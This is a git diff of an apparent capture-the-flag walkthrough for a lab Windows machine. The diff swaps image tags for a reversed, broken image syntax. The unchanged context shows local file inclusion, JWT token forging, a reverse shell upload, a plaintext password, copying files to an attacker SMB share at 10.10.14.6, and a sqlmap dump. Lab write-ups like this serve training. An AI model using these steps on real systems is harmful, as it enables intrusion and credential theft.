@@ -55,33 +55,33 @@ We have 6 ports open:
 
 Let's take a loot at both ports 80/443, but seems they both give us the same pages! We can work one of these
 
-<img alt="test" src="/assets/img/htb-breadcrumbs/e-book.png">
+!(ebook)[/assets/img/htb-breadcrumbs/e-book.png]
 
 Seems like it's an e-book library
 
-<img alt="test" src="/assets/img/htb-breadcrumbs/eth.png">
+!(eth)[/assets/img/htb-breadcrumbs/eth.png]
 
 We have a search page for books, let's try to play with it a bit
 
-<img alt="test" src="/assets/img/htb-breadcrumbs/ethtest.png">
+!(ethtest)[/assets/img/htb-breadcrumbs/ethtest.png]
 
 I tried few manual enumeration but nothing seem to give me an interesting output! 
 
 Let's capture the request with burpsuite to see what's actually going on
 
- <img alt="test" src="/assets/img/htb-breadcrumbs/LFI1.png">
+ !(lfi1)[/assets/img/htb-breadcrumbs/LFI1.png]
 
  Aside from the title and author parameters we have "method=0" which seems odd
 
 Let's first send the request to repeater and change "method=1"
 
- <img alt="test" src="/assets/img/htb-breadcrumbs/LFI21.png">
+ !(lfi21)[/assets/img/htb-breadcrumbs/LFI21.png]
 
- <img alt="test" src="/assets/img/htb-breadcrumbs/LFI22.png">
+ !(lfi22)[/assets/img/htb-breadcrumbs/LFI22.png]
 
  We get a different and an interesting response which screams "local file inclusion" that also leaks the parameter "book", let's check if that works
 
- <img alt="test" src="/assets/img/htb-breadcrumbs/LFI3.png">
+ !(lfi3)[/assets/img/htb-breadcrumbs/LFI3.png]
 
  And yes! We have an LFI, let's keep enumerating we don't really have anything interesting to read yet
 
@@ -94,12 +94,12 @@ gobuster dir -u http://10.10.10.228/ -w /usr/share/seclists/Discovery/Web-Conten
 > -x prefix for adding extensions when fuzzing , since we're working on windows box we may find asp/x files
 > Also chose the lowercase version of raft-directories because windows is key sensitive,
 
-<img alt="test" src="/assets/img/htb-breadcrumbs/gob.png">
+!(gob)[/assets/img/htb-breadcrumbs/gob.png]
 
 Seems like we have a login panel
 
 
-<img alt="test" src="/assets/img/htb-breadcrumbs/login.png">
+!(login)[/assets/img/htb-breadcrumbs/login.png]
 
 Since we're looking for files to read we're not gonna try to do stuff with the login panel! Let's run gobuster again 
 
@@ -108,23 +108,23 @@ gobuster dir -u http://10.10.10.228/portal -w /usr/share/seclists/Discovery/Web-
 ```
 
 
-<img alt="test" src="/assets/img/htb-breadcrumbs/gob1.png">
+!(gob)[/assets/img/htb-breadcrumbs/gob1.png]
 
 Let's check all of these
 
 
 `/includes/`
-<img alt="test" src="/assets/img/htb-breadcrumbs/include.png">
+!(gob2)[/assets/img/htb-breadcrumbs/include.png]
 
 
 
 `/php/`
-<img alt="test" src="/assets/img/htb-breadcrumbs/files.png">
+!()[/assets/img/htb-breadcrumbs/files.png]
 
 
 
 
-<img alt="test" src="/assets/img/htb-breadcrumbs/users.png">
+!()[/assets/img/htb-breadcrumbs/users.png]
 Here we have a list of users, Let's take note of them first and save them somewhere in case we needed users later
 
 
@@ -138,7 +138,7 @@ Let's not waste more time and check the files under /includes/ and also the cook
 `include/fileController.php`
 
 
-<img alt="test" src="/assets/img/htb-breadcrumbs/filecont.png">
+!()[/assets/img/htb-breadcrumbs/filecont.png]
 
 We get the JWT secret
 
@@ -156,7 +156,7 @@ Seems like we need to login as the user paul
 
 Let's check `Cookie.php`
 
-<img alt="test" src="/assets/img/htb-breadcrumbs/cookie.png">
+!()[/assets/img/htb-breadcrumbs/cookie.png]
 
 If we clean the response, a quick sed to remove the "\r \n and \"
 
@@ -192,13 +192,13 @@ for ($seed = 0; $seed <= strlen($user) - 1; $seed++) {
 ?>
 ```
 
-<img alt="test" src="/assets/img/htb-breadcrumbs/cok.png">
+!()[/assets/img/htb-breadcrumbs/cok.png]
 
 Let's try them one by one and check if we can get in
 
-<img alt="test" src="/assets/img/htb-breadcrumbs/adm1.png">
+!()[/assets/img/htb-breadcrumbs/adm1.png]
 
-<img alt="test" src="/assets/img/htb-breadcrumbs/adm.png">
+!()[/assets/img/htb-breadcrumbs/adm.png]
 
 
 And we're in!
@@ -206,16 +206,16 @@ And we're in!
 
 Nothing interesting in the Issues page
 
-<img alt="test" src="/assets/img/htb-breadcrumbs/Issues.png">
+!()[/assets/img/htb-breadcrumbs/Issues.png]
 
 Let's check the File management page
 
-<img alt="test" src="/assets/img/htb-breadcrumbs/file.png">
+!()[/assets/img/htb-breadcrumbs/file.png]
 
 Let's try to upload anything to see if it works
 
 
-<img alt="test" src="/assets/img/htb-breadcrumbs/token.png">
+!()[/assets/img/htb-breadcrumbs/token.png]
 
 Seems like we need a token! We have the secret, but we forgot to check what data we should provide!
 Let's check the response back
@@ -236,7 +236,7 @@ According to this response the content of JWT token should be
 Now we have everything we need let's forge our token, we can either use python or jwt.io
 
 
-<img alt="test" src="/assets/img/htb-breadcrumbs/jwt.png">
+!()[/assets/img/htb-breadcrumbs/jwt.png]
 
 ```
 eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkYXRhIjp7InVzZXJuYW1lIjoicGF1bCJ9fQ.4mJguG8tRd2z_feWJpmr_J3AdMeDPvW7GCK7cW7o0AI
@@ -244,18 +244,18 @@ eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkYXRhIjp7InVzZXJuYW1lIjoicGF1bCJ9fQ.4mJg
 
 Let's add the cookie to our browser
 
-<img alt="test" src="/assets/img/htb-breadcrumbs/newjwt.png">
+!()[/assets/img/htb-breadcrumbs/newjwt.png]
 
 Let's to import anything 
 
-<img alt="test" src="/assets/img/htb-breadcrumbs/succ.png">
+!()[/assets/img/htb-breadcrumbs/succ.png]
 
 It worked!
 
 Let's upload the reverse shell!
 
 
-<img alt="test" src="/assets/img/htb-breadcrumbs/foothold.png">
+!()[/assets/img/htb-breadcrumbs/foothold.png]
 
 And we're in
 
@@ -271,9 +271,9 @@ As usual, before running any enumeration tool we can check the webpage source to
 
 We can see an interesting folder under the /portal/ 
 
-<img alt="test" src="/assets/img/htb-breadcrumbs/data.png">
+!()[/assets/img/htb-breadcrumbs/data.png]
 
-<img alt="test" src="/assets/img/htb-breadcrumbs/userdata.png">
+!()[/assets/img/htb-breadcrumbs/userdata.png]
 
 We have few files for users,
 Let's check if they contains any password
@@ -282,7 +282,7 @@ Let's check if they contains any password
 ```
 Get-ChildItem | Select-String 'password'
 ```
-<img alt="test" src="/assets/img/htb-breadcrumbs/userflag.png">
+!()[/assets/img/htb-breadcrumbs/userflag.png]
 
 And we get creds for user juliette
 
@@ -293,7 +293,7 @@ juliette:jUli901./())!
 Let's try to ssh into the box with these creds
 
 
-<img alt="test" src="/assets/img/htb-breadcrumbs/userf.png">
+!()[/assets/img/htb-breadcrumbs/userf.png]
 
 
 ---
@@ -304,8 +304,8 @@ Let's try to ssh into the box with these creds
 
 In juliette's Desktop we can find an interesting file `todo.html`
 
-<img alt="test" src="/assets/img/htb-breadcrumbs/todo1.png">
-<img alt="test" src="/assets/img/htb-breadcrumbs/todo2.png">
+!()[/assets/img/htb-breadcrumbs/todo1.png]
+!()[/assets/img/htb-breadcrumbs/todo2.png]
 
 Seems like we need to get the passwords that are stored in the stickynotes! According to google they should located under the %appdata% folder
 
@@ -313,7 +313,7 @@ Seems like we need to get the passwords that are stored in the stickynotes! Acco
 Get-ChildItem *Sticky* -Recurse
 ```
 
-<img alt="test" src="/assets/img/htb-breadcrumbs/sticky.png">
+!()[/assets/img/htb-breadcrumbs/sticky.png]
 
 We found a directory!
 ```
@@ -321,7 +321,7 @@ C:\users\juliette\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d
 ```
 It contains more folders, the \LocalState\ seems interesting!
 
-<img alt="test" src="/assets/img/htb-breadcrumbs/state.png">
+!()[/assets/img/htb-breadcrumbs/state.png]
 
 Let's copy these files to our machine!
 Fist we start our smbserver
@@ -334,7 +334,7 @@ and copy these files!
 ```
 copy * \\10.10.14.6\euch
 ```
-<img alt="test" src="/assets/img/htb-breadcrumbs/smb.png">
+!()[/assets/img/htb-breadcrumbs/smb.png]
 
 Let's check the files! the only interesting file we need is `plum.sqlite-wal`
 
@@ -346,7 +346,7 @@ It contains  the creds for the development user
 
 Let's try to ssh with these creds
 
-<img alt="test" src="/assets/img/htb-breadcrumbs/sshdev.png">
+!()[/assets/img/htb-breadcrumbs/sshdev.png]
 
 
 ---
@@ -357,7 +357,7 @@ Let's try to ssh with these creds
 
 Now we're logged in as development, we can check what's inside `C:\Development\`
 
-<img alt="test" src="/assets/img/htb-breadcrumbs/ff.png">
+!()[/assets/img/htb-breadcrumbs/ff.png]
 
 Let's copy it to our machine
 
@@ -365,11 +365,11 @@ Let's copy it to our machine
 copy Krypter_Linux \\10.10.14.6\euch
 
 ```
-<img alt="test" src="/assets/img/htb-breadcrumbs/kryp.png">
+!()[/assets/img/htb-breadcrumbs/kryp.png]
 
 It's a Linux executable, before going deeper in the binary it's better to run strings or rabin2 -z to extract the printable strings in the binary!
 
-<img alt="test" src="/assets/img/htb-breadcrumbs/rabin.png">
+!()[/assets/img/htb-breadcrumbs/rabin.png]
 
 What seems odd when you see the output is the port 1234! 
 
@@ -383,7 +383,7 @@ method=select&username=administrator&table=passwords
 ```
 Seems like it's running locally! 
 
-<img alt="test" src="/assets/img/htb-breadcrumbs/local.png">
+!()[/assets/img/htb-breadcrumbs/local.png]
 
 
 Let's forward it to our machine with ssh
@@ -392,7 +392,7 @@ Let's forward it to our machine with ssh
 ssh -L 1234:127.0.0.1:1234 development@10.10.10.228
 ```
 
-<img alt="test" src="/assets/img/htb-breadcrumbs/for.png">
+!()[/assets/img/htb-breadcrumbs/for.png]
 
 The parameters names gives us a hint that it's SQL injection
 let's use sqlmap
@@ -401,18 +401,18 @@ let's use sqlmap
 ```
 sqlmap -u "http://127.0.0.1:1234/?method=select&username=administrator&table=passwords" --dump
 ```
-<img alt="test" src="/assets/img/htb-breadcrumbs/us.png">
+!()[/assets/img/htb-breadcrumbs/us.png]
 
-<img alt="test" src="/assets/img/htb-breadcrumbs/AES.png">
+!()[/assets/img/htb-breadcrumbs/AES.png]
 
 We get the administrator's password but it's encrypted (AES) 
 
 Let's use cyberchef to decrypt it
 
-<img alt="test" src="/assets/img/htb-breadcrumbs/root.png">
+!()[/assets/img/htb-breadcrumbs/root.png]
 
 > When i first did the machine, I overthinked this part,  I thought that i needed to to find IV somewhere in the machine <Wasted a lot of time trying to find it> 
 
 And now let's try to ssh into the box as the administrator and grab the flag!
 
-<img alt="test" src="/assets/img/htb-breadcrumbs/rooted.png">
+!()[/assets/img/htb-breadcrumbs/rooted.png]
